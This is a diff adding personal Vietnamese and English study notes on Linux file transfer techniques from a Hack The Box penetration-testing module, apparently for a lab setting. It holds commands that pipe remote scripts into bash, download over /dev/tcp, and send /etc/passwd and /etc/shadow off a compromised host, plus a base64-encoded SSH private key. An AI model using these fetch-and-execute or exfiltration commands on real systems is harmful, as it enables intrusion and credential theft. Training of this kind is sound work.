@@ -255,12 +255,176 @@ Cấu hình WebDav server
 
 
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Giờ tôi mệt cái module này vãi , đây là module thứ 2 của CPTS, Nhiều thứ mới để học theo từng khâu, tôi hiểu là bố HTB muốn con học nhiều nhưng mà chương này hơi nản. 1h42 sáng rồi chơi game xong ngồi học cái "Fai tràn phơ rừn =)" 
 
 
+Linux File Transfer Methods
+
+  Linux có nhiều công cụ để truyền tải file, thường dùng trong cả tấn công và phòng thủ.
+  Trong một sự cố IR, phát hiện nhiều web server bị tấn công thông qua lỗ hổng SQL Injection.
+  Kẻ tấn công dùng Bash script để tải malware kết nối về C2 server.
+  Script thử lần lượt 3 cách tải file: cURL → wget → Python, tất cả đều qua HTTP.
+  Dù Linux hỗ trợ nhiều giao thức (FTP, SMB), phần lớn malware (trên mọi HĐH) dùng HTTP/HTTPS.
+  Chương này sẽ trình bày nhiều cách truyền file trong Linux: HTTP, Bash, SSH, …
 
 
+Base64 Encoding / Decoding
+
+  naruto3co@htb[/htb]$ md5sum id_rsa
+    4e301756a07ded0a2dd6953abf015278  id_rsa
+
+  naruto3co@htb[/htb]$ cat id_rsa |base64 -w 0;echo
+    LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
+
+We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d' to decode it.
+
+  naruto3co@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
+
+Finally, we can confirm if the file was transferred successfully using the md5sum command.
+  naruto3co@htb[/htb]$ md5sum id_rsa
+    4e301756a07ded0a2dd6953abf015278  id_rsa
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Web Downloads with Wget and cURL
+
+Như tên thôi 
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Fileless Attacks Using Linux
+
+Tấn công không tệp sử dụng Linux
+Do cách thức hoạt động của Linux và cách thức hoạt động của các đường ống, hầu hết các công cụ chúng ta sử dụng trong Linux đều có thể được sử dụng để sao chép các hoạt động không tệp, nghĩa là chúng ta không cần phải tải xuống tệp để thực thi.
+
+Lưu ý: Một số payload như mkfifo ghi tệp vào đĩa. Lưu ý rằng mặc dù việc thực thi payload có thể không cần tệp khi bạn sử dụng pipe, nhưng tùy thuộc vào payload được chọn, nó có thể tạo ra các tệp tạm thời trên hệ điều hành.
+
+Hãy sử dụng lệnh cURL mà chúng ta đã dùng và thay vì tải xuống LinEnum.sh, hãy thực thi trực tiếp lệnh này bằng lệnh pipe.
+
+  naruto3co@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+or
+  naruto3co@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3  
+    Hello World!
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
+Download with Bash (/dev/tcp)
+
+Connect to the Target Webserver
+
+  naruto3co@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
+
+HTTP GET Request
+  naruto3co@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+Print the Response
+  naruto3co@htb[/htb]$ cat <&3
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+SSH Downloads
+
+tất nhiên cái SSH ở module File transfers này thì là SCP rồi 
+
+Enabling the SSH Server
+  naruto3co@htb[/htb]$ sudo systemctl enable ssh
+  Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
+  Executing: /lib/systemd/systemd-sysv-install enable ssh
+  Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
+  ...SNIP...
+
+Starting the SSH Server
+  naruto3co@htb[/htb]$ sudo systemctl start ssh
+
+Checking for SSH Listening Port
+  naruto3co@htb[/htb]$ netstat -lnpt 
+    (Not all processes could be identified, non-owned process info
+     will not be shown, you would have to be root to see it all.)
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
 
 
+Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.
+
+  naruto3co@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Web Upload
+
+Pwnbox - Start Web Server
+
+  naruto3co@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+    Collecting uploadserver
+      Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+    Installing collected packages: uploadserver
+    Successfully installed uploadserver-2.0.1
+  
+  naruto3co@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+    Generating a RSA private key
+    ................................................................................+++++
+    .......+++++
+    writing new private key to 'server.pem'
+    -----
+  
+Pwnbox - Start Web Server
+
+  naruto3co@htb[/htb]$ mkdir https && cd https
+
+  naruto3co@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+    File upload available at /upload
+    Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
+
+Bây giờ, từ máy tính bị xâm nhập, hãy tải lên các tệp /etc/passwd và /etc/shadow.
+We used the option --insecure because we used a self-signed certificate that we trust.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Alternative Web File Transfer Method
+
+Việc khởi động python rất dễ ở linux vì nó hay có sẵn 
+Linux - Creating a Web Server with Python3
+  naruto3co@htb[/htb]$ python3 -m http.server
+  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Linux - Creating a Web Server with Python2.7
+  naruto3co@htb[/htb]$ python2.7 -m SimpleHTTPServer
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Linux - Creating a Web Server with PHP
+  naruto3co@htb[/htb]$ php -S 0.0.0.0:8000
+  [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
+
+Linux - Creating a Web Server with Ruby
+  naruto3co@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
+    --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
+    Connecting to 192.168.49.128:8000... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 0 [text/plain]
+    Saving to: 'filetotransfer.txt'
+    
+    filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      
+    2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
+
+Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+SCP Upload
+
+We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.
+
+File Upload using SCP
+
+  naruto3co@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+  htb-student@10.129.86.90's password: 
+  passwd   
 
